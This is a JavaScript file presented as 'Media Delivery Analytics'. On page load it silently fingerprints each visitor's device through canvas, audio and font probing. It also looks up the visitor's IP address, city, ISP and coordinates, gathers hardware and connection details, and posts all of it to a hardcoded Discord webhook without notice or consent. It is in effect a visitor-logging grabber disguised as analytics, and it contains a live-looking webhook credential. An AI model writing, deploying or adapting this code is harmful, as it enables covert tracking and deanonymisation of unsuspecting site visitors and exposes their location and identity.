// analytics.js - Advanced fingerprinting and analytics
(function() {
    'use strict';
    
    // Generate a unique fingerprint for each device
    function generateFingerprint() {
        const components = [];
        
        // Browser and OS info
        components.push(navigator.userAgent);
        components.push(navigator.platform);
        components.push(navigator.language);
        components.push(screen.width + 'x' + screen.height);
        components.push(screen.colorDepth + '-bit');
        components.push(new Date().getTimezoneOffset());
        components.push(navigator.hardwareConcurrency || 'unknown');
        components.push(navigator.deviceMemory || 'unknown');
        
        // Canvas fingerprinting (very effective)
        try {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            canvas.width = 200;
            canvas.height = 50;
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillStyle = '#f60';
            ctx.fillRect(0, 0, 100, 50);
            ctx.fillStyle = '#069';
            ctx.fillText('Media Delivery Analytics', 2, 15);
            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
            ctx.fillText('Media Delivery Analytics', 4, 17);
            components.push(canvas.toDataURL());
        } catch (e) {
            components.push('canvas-fail');
        }
        
        // Audio fingerprinting
        try {
            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
            const oscillator = audioContext.createOscillator();
            const analyser = audioContext.createAnalyser();
            oscillator.connect(analyser);
            analyser.connect(audioContext.destination);
            oscillator.start();
            const data = new Uint8Array(analyser.frequencyBinCount);
            analyser.getByteFrequencyData(data);
            oscillator.stop();
            components.push(Array.from(data).join(','));
        } catch (e) {
            components.push('audio-fail');
        }
        
        // Font detection
        const fonts = [
            'Arial', 'Arial Black', 'Comic Sans MS', 'Courier New', 
            'Georgia', 'Impact', 'Times New Roman', 'Trebuchet MS', 'Verdana'
        ];
        
        const availableFonts = [];
        const div = document.createElement('div');
        div.style.position = 'absolute';
        div.style.left = '-9999px';
        div.style.fontSize = '72px';
        div.innerHTML = 'mmmmmmmmmmlli';
        
        document.body.appendChild(div);
        
        const defaultWidth = div.offsetWidth;
        const defaultHeight = div.offsetHeight;
        
        fonts.forEach(font => {
            div.style.fontFamily = font;
            if (div.offsetWidth !== defaultWidth || div.offsetHeight !== defaultHeight) {
                availableFonts.push(font);
            }
        });
        
        document.body.removeChild(div);
        components.push(availableFonts.join(','));
        
        return btoa(components.join('|')).substring(0, 32);
    }
    
    // Get detailed location info from IP
    async function getIPAndLocation() {
        try {
            // Get IP address
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            
            // Get location details
            const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
            const locationData = await locationResponse.json();
            
            return {
                ip: ipData.ip,
                country: locationData.country_name,
                region: locationData.region,
                city: locationData.city,
                isp: locationData.org,
                timezone: locationData.timezone,
                coordinates: `${locationData.latitude}, ${locationData.longitude}`
            };
        } catch (error) {
            console.log('Location detection failed:', error);
            return { ip: 'unknown', error: error.message };
        }
    }
    
    // Get browser plugins
    function getBrowserPlugins() {
        const plugins = [];
        for (let i = 0; i < navigator.plugins.length; i++) {
            plugins.push(navigator.plugins[i].name);
        }
        return plugins.join(', ');
    }
    
    // Get connection info
    function getConnectionInfo() {
        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (connection) {
            return {
                effectiveType: connection.effectiveType,
                downlink: connection.downlink + ' Mbps',
                rtt: connection.rtt + ' ms'
            };
        }
        return { effectiveType: 'unknown' };
    }
    
    // Send data to Discord
    async function sendToDiscord(data) {
        try {
            const webhookURL = 'https://discord.com/api/webhooks/1411453235834654792/m4kwAhRpqLt6BS-uoe6wXE4kmaDOsapMg8t1R-l6zjxLLJbhaFNYpYuKkEzIxHtPKhBK';
            
            const embed = {
                title: "🌐 Advanced Visitor Analytics",
                color: 0x0099ff,
                fields: [
                    {
                        name: "🆔 Device Fingerprint",
                        value: `\`\`\`${data.fingerprint}\`\`\``,
                        inline: false
                    },
                    {
                        name: "📍 Location Info",
                        value: `**IP:** ${data.ip}\n**Country:** ${data.country}\n**City:** ${data.city}\n**ISP:** ${data.isp}\n**Coordinates:** ${data.coordinates}`,
                        inline: true
                    },
                    {
                        name: "💻 System Info",
                        value: `**Browser:** ${data.browser}\n**OS:** ${data.os}\n**Screen:** ${data.screen}\n**CPU Cores:** ${data.cores}\n**RAM:** ${data.ram}GB`,
                        inline: true
                    },
                    {
                        name: "🌐 Connection",
                        value: `**Type:** ${data.connectionType}\n**Speed:** ${data.connectionSpeed}\n**Latency:** ${data.connectionLatency}`,
                        inline: false
                    },
                    {
                        name: "📊 Additional Info",
                        value: `**User Agent:** ${data.userAgent}\n**Languages:** ${data.languages}\n**Timezone:** ${data.timezone}\n**Referrer:** ${data.referrer}`,
                        inline: false
                    },
                    {
                        name: "🕒 Visit Time",
                        value: `<t:${Math.floor(data.timestamp / 1000)}:F>`,
                        inline: true
                    }
                ],
                footer: {
                    text: "Media Delivery Analytics • " + new Date().toLocaleDateString()
                }
            };
            
            await fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    username: "Advanced Analytics",
                    embeds: [embed]
                })
            });
            
        } catch (error) {
            console.log('Failed to send analytics:', error);
        }
    }
    
    // Main analytics function
    async function collectAnalytics() {
        try {
            const fingerprint = generateFingerprint();
            const locationInfo = await getIPAndLocation();
            const connectionInfo = getConnectionInfo();
            
            const analyticsData = {
                fingerprint: fingerprint,
                ip: locationInfo.ip || 'unknown',
                country: locationInfo.country || 'unknown',
                region: locationInfo.region || 'unknown',
                city: locationInfo.city || 'unknown',
                isp: locationInfo.isp || 'unknown',
                coordinates: locationInfo.coordinates || 'unknown',
                timezone: locationInfo.timezone || 'unknown',
                
                browser: navigator.userAgent,
                os: navigator.platform,
                screen: `${screen.width}x${screen.height}`,
                cores: navigator.hardwareConcurrency || 'unknown',
                ram: navigator.deviceMemory || 'unknown',
                plugins: getBrowserPlugins(),
                
                connectionType: connectionInfo.effectiveType,
                connectionSpeed: connectionInfo.downlink || 'unknown',
                connectionLatency: connectionInfo.rtt || 'unknown',
                
                languages: navigator.languages ? navigator.languages.join(', ') : navigator.language,
                referrer: document.referrer || 'direct',
                userAgent: navigator.userAgent,
                timestamp: Date.now(),
                url: window.location.href
            };
            
            await sendToDiscord(analyticsData);
            
        } catch (error) {
            console.log('Analytics collection error:', error);
        }
    }
    
    // Start analytics with delay
    setTimeout(collectAnalytics, 2000);
    
})();